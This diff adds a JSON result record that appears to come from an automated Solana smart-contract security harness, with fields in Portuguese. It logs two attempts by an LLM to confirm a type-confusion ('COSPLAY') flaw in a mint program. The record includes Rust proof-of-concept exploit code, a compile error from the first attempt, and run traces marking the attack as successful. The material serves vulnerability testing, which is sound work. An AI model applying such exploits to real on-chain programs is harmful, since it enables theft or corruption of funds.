@@ -1,0 +1,115 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply e balance atualizados em conta de outro tipo",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2426,
+        "completion_tokens": 635,
+        "latency_s": 3.84
+      },
+      "raw": "{\n  \"plan\": \"O programa `mint` (Pinocchio) lê supply e balance de offsets fixos 40..48 e 48..56 sem verificar discriminador de tipo. Vou preparar uma conta 'ledger' legítima com esses campos e chamar baseline com IX_MINT=2 e amount=10, provando que o cenário está correto. No ataque, passarei uma conta de outro tipo (dados diferentes nos primeiros bytes, mas com bytes 40..56 interpretáveis como supply/balance) para a mesma instrução, sem alterar o restante. O efeito medido será que a instrução aceitou a conta estranha e gravou os novos valores nos offsets 40..56, demonstrando o COSPLAY.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 64];\\nledger_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador de outro tipo\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 10;\\nlet mut ix_data = vec![2u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\nlet ix = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet r_base = env.baseline(\\\"mint legitimo\\\", &ix, &contas);\\n\\nlet mut attack_data = vec![0u8; 64];\\nattack_data[0..8].copy_from_slice(&[0xBB; 8]); // discriminador diferente do baseline\\nattack_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nattack_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet attack_ledger = account(&env.program_id, &attack_data, None);\\nlet attack_contas = vec![(ledger_key, attack_ledger)];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo como ledger\\\", &ix, &attack_contas);\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    env.effect(\\\"supply e balance atualizados em conta de outro tipo\\\", read_u64(d, 40) == 110 && read_u64(d, 48) == 60);\\n}\"\n}",
+      "plan": "O programa `mint` (Pinocchio) lê supply e balance de offsets fixos 40..48 e 48..56 sem verificar discriminador de tipo. Vou preparar uma conta 'ledger' legítima com esses campos e chamar baseline com IX_MINT=2 e amount=10, provando que o cenário está correto. No ataque, passarei uma conta de outro tipo (dados diferentes nos primeiros bytes, mas com bytes 40..56 interpretáveis como supply/balance) para a mesma instrução, sem alterar o restante. O efeito medido será que a instrução aceitou a conta estranha e gravou os novos valores nos offsets 40..56, demonstrando o COSPLAY.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 64];\nledger_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador de outro tipo\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 10;\nlet mut ix_data = vec![2u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\nlet ix = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet r_base = env.baseline(\"mint legitimo\", &ix, &contas);\n\nlet mut attack_data = vec![0u8; 64];\nattack_data[0..8].copy_from_slice(&[0xBB; 8]); // discriminador diferente do baseline\nattack_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nattack_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet attack_ledger = account(&env.program_id, &attack_data, None);\nlet attack_contas = vec![(ledger_key, attack_ledger)];\n\nlet r = env.attack(\"cosplay: conta de outro tipo como ledger\", &ix, &attack_contas);\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    env.effect(\"supply e balance atualizados em conta de outro tipo\", read_u64(d, 40) == 110 && read_u64(d, 48) == 60);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:19:35\n    |\n 19 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:19:35\n    |\n 19 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 1 previous error"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3070,
+        "completion_tokens": 598,
+        "latency_s": 3.2
+      },
+      "raw": "{\"plan\": \"Preparo uma conta 'ledger' com 64 bytes cujo layout nas posicoes 40..56 contem supply=100 e balance=50, e um discriminador de outro tipo (0xAA). O baseline chama mint legitimamente com essa conta, provando que o cenario esta montado. O ataque passa uma conta com discriminador diferente (0xBB) mas mesmo layout, explorando a ausencia de verificacao de tipo. O efeito mede que supply e balance foram atualizados (110 e 60) numa conta de outro tipo, o que o uso legitimo nao faria.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 64];\\nledger_data[0..8].copy_from_slice(&[0xAA; 8]);\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 10;\\nlet mut ix_data = vec![2u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\nlet metas = vec![AccountMeta::new(ledger_key, false)];\\nlet ix = env.raw_ix(&ix_data, metas.clone());\\nlet contas = vec![(ledger_key, ledger.clone())];\\n\\nlet _r_base = env.baseline(\\\"mint legitimo\\\", &ix, &contas);\\n\\nlet mut attack_data = vec![0u8; 64];\\nattack_data[0..8].copy_from_slice(&[0xBB; 8]);\\nattack_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nattack_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet attack_ledger = account(&env.program_id, &attack_data, None);\\nlet attack_contas = vec![(ledger_key, attack_ledger)];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo como ledger\\\", &ix, &attack_contas);\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    env.effect(\\\"supply e balance atualizados em conta de outro tipo\\\", read_u64(d, 40) == 110 && read_u64(d, 48) == 60);\\n}\"}",
+      "plan": "Preparo uma conta 'ledger' com 64 bytes cujo layout nas posicoes 40..56 contem supply=100 e balance=50, e um discriminador de outro tipo (0xAA). O baseline chama mint legitimamente com essa conta, provando que o cenario esta montado. O ataque passa uma conta com discriminador diferente (0xBB) mas mesmo layout, explorando a ausencia de verificacao de tipo. O efeito mede que supply e balance foram atualizados (110 e 60) numa conta de outro tipo, o que o uso legitimo nao faria.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 64];\nledger_data[0..8].copy_from_slice(&[0xAA; 8]);\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 10;\nlet mut ix_data = vec![2u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\nlet metas = vec![AccountMeta::new(ledger_key, false)];\nlet ix = env.raw_ix(&ix_data, metas.clone());\nlet contas = vec![(ledger_key, ledger.clone())];\n\nlet _r_base = env.baseline(\"mint legitimo\", &ix, &contas);\n\nlet mut attack_data = vec![0u8; 64];\nattack_data[0..8].copy_from_slice(&[0xBB; 8]);\nattack_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nattack_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet attack_ledger = account(&env.program_id, &attack_data, None);\nlet attack_contas = vec![(ledger_key, attack_ledger)];\n\nlet r = env.attack(\"cosplay: conta de outro tipo como ledger\", &ix, &attack_contas);\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    env.effect(\"supply e balance atualizados em conta de outro tipo\", read_u64(d, 40) == 110 && read_u64(d, 48) == 60);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo",
+            "result": "Success",
+            "compute_units": 235,
+            "account_flags": "-w",
+            "ix_head": "020a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "aaaaaaaaaaaaaaaa",
+                "digest": "812e7c9d865bb4c7",
+                "post": "aaaaaaaaaaaaaaaa00000000000000000000000000000000000000000000000000000000000000006e000000000000003c000000000000000000000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay: conta de outro tipo como ledger",
+            "result": "Success",
+            "compute_units": 235,
+            "account_flags": "-w",
+            "ix_head": "020a000000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 64,
+                "head": "bbbbbbbbbbbbbbbb",
+                "digest": "e0a16fd8a9a532fd",
+                "post": "bbbbbbbbbbbbbbbb00000000000000000000000000000000000000000000000000000000000000006e000000000000003c000000000000000000000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply e balance atualizados em conta de outro tipo",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 235 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 235 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply e balance atualizados em conta de outro tipo"
+    }
+  ],
+  "case_id": "SSP-03-P-S1",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let supply = u64::from_le_bytes(data[40..48].try_into().unwrap());\nlet balance = u64::from_le_bytes(data[48..56].try_into().unwrap());",
+    "explanation": "Os dados da conta sao desserializados manualmente a partir de offsets fixos (40..48 e 48..56) sem verificar nenhum discriminador ou tag de tipo no inicio do buffer. Uma conta de outro tipo com layout compativel poderia ser passada como ledger.",
+    "attack_hypothesis": "Um atacante forneceria uma conta de um tipo diferente cujo layout de bytes nas posicoes 40..56 seja interpretavel como supply/balance, fazendo a instrucao tratar dados de outro tipo como um ledger valido."
+  }
+}
